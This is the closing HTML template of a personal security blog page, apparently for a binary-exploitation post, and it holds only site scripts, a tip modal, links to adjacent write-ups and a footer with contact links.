                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
<div id="article-share">

    
    <div class="social-share" data-sites="qq,qzone,wechat,weibo,douban,twitter" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
    <script src="/libs/share/js/social-share.min.js"></script>
    

    

</div>

                </div>
            </div>
            
                <style>
    #reward {
        margin: 40px 0;
        text-align: center;
    }

    #reward .reward-link {
        font-size: 1.4rem;
        line-height: 38px;
    }

    #reward .btn-floating:hover {
        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
    }

    #rewardModal {
        width: 320px;
        height: 350px;
    }

    #rewardModal .reward-title {
        margin: 15px auto;
        padding-bottom: 5px;
    }

    #rewardModal .modal-content {
        padding: 10px;
    }

    #rewardModal .close {
        position: absolute;
        right: 15px;
        top: 15px;
        color: rgba(0, 0, 0, 0.5);
        font-size: 1.3rem;
        line-height: 20px;
        cursor: pointer;
    }

    #rewardModal .close:hover {
        color: #ef5350;
        transform: scale(1.3);
        -moz-transform:scale(1.3);
        -webkit-transform:scale(1.3);
        -o-transform:scale(1.3);
    }

    #rewardModal .reward-tabs {
        margin: 0 auto;
        width: 210px;
    }

    .reward-tabs .tabs {
        height: 38px;
        margin: 10px auto;
        padding-left: 0;
    }

    .reward-content ul {
        padding-left: 0 !important;
    }

    .reward-tabs .tabs .tab {
        height: 38px;
        line-height: 38px;
    }

    .reward-tabs .tab a {
        color: #fff;
        background-color: #ccc;
    }

    .reward-tabs .tab a:hover {
        background-color: #ccc;
        color: #fff;
    }

    .reward-tabs .wechat-tab .active {
        color: #fff !important;
        background-color: #22AB38 !important;
    }

    .reward-tabs .alipay-tab .active {
        color: #fff !important;
        background-color: #019FE8 !important;
    }

    .reward-tabs .reward-img {
        width: 210px;
        height: 210px;
    }
</style>

<div id="reward">
    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
            <div class="card">
                <a href="/2019/07/06/smfonos/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="Vulnhub - Symfonos">
                        
                        <span class="card-title">Vulnhub - Symfonos</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            Today, we are going to pwn Symfonos from Vulnhub.
Machine SetupNothing much to setup in the machine, just import it to V
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2019-07-06
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/Vulnhub/" class="post-category">
                                    Vulnhub
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/nmap-ctf-vulnhub/">
                        <span class="chip bg-color">nmap, ctf, vulnhub</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                Current&nbsp;<i class="far fa-dot-circle"></i>
            </div>
            <div class="card">
                <a href="/2018/09/13/fmt-bof/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="Binary Exploitation - Format String + Buffer Overflow Vulnerability">
                        
                        <span class="card-title">Binary Exploitation - Format String + Buffer Overflow Vulnerability</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            A detailed guide to use a format string vulnerability to bypass protections and use the buffer overflow vulnerability to
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2018-09-12
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/Binary-Exploitation/" class="post-category">
                                    Binary Exploitation
                                </a>
                            
                            
                        </span>
                    </div>
                </div>

                
                <div class="card-action article-tags">
                    
                    <a href="/tags/pwn-fmtstr-bof/">
                        <span class="chip bg-color">pwn, fmtstr, bof</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


<!-- 代码块折行 -->

<style type="text/css">
code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
</style>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
    <div class="container row center-align" style="margin-bottom: 15px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            <span id="year">2019</span>
            <a href="https://justrying-code.github.io" target="_blank">D4mianWayne</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;Total Word Count:&nbsp;<span
                class="white-color">18k</span>&nbsp;words
            
            
            
            
            
            
            <span id="busuanzi_container_site_pv">
                |&nbsp;<i class="far fa-eye"></i>&nbsp;Total Visits:&nbsp;<span id="busuanzi_value_site_pv"
                    class="white-color"></span>&nbsp;times
            </span>
            
            
            <span id="busuanzi_container_site_uv">
                |&nbsp;<i class="fas fa-users"></i>&nbsp;Total number of visitors:&nbsp;<span id="busuanzi_value_site_uv"
                    class="white-color"></span>&nbsp;people
            </span>
            
            <br>
            
            <span id="sitetime">Loading Runtime....</span>
            <script>
                function siteTime() {
                    var seconds = 1000;
                    var minutes = seconds * 60;
                    var hours = minutes * 60;
                    var days = hours * 24;
                    var years = days * 365;
                    var today = new Date();
                    var startYear = "2019";
                    var startMonth = "09";
                    var startDate = "20";
                    var startHour = "0";
                    var startMinute = "0";
                    var startSecond = "0";
                    var todayYear = today.getFullYear();
                    var todayMonth = today.getMonth() + 1;
                    var todayDate = today.getDate();
                    var todayHour = today.getHours();
                    var todayMinute = today.getMinutes();
                    var todaySecond = today.getSeconds();
                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
                    var diff = t2 - t1;
                    var diffYears = Math.floor(diff / years);
                    var diffDays = Math.floor((diff / days) - diffYears * 365);
                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
                        minutes);
                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
                        diffMinutes * minutes) / seconds);
                    if (startYear == todayYear) {
                        document.getElementById("year").innerHTML = todayYear;
                        document.getElementById("sitetime").innerHTML = "This site has been safely operated " + diffDays + " days " + diffHours +
                            " hours " + diffMinutes + " minutes " + diffSeconds + " seconds";
                    } else {
                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
                        document.getElementById("sitetime").innerHTML = "This site has been safely operated " + diffYears + " years " + diffDays +
                            " days " + diffHours + " hours " + diffMinutes + " minutes " + diffSeconds + " seconds";
                    }
                }
                setInterval(siteTime, 1000);
            </script>
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/D4mianWayne" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:dubeyayushmanrobin@gmail.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;Search</span>
            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script src="/js/search.js"></script>
<script type="text/javascript">
$(function () {
    searchFunc("/search.xml", 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    

    
    
    <script type="text/javascript" size="150" alpha='0.6'
        zIndex="-1" src="/libs/background/ribbon-refresh.min.js" async="async"></script>
    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
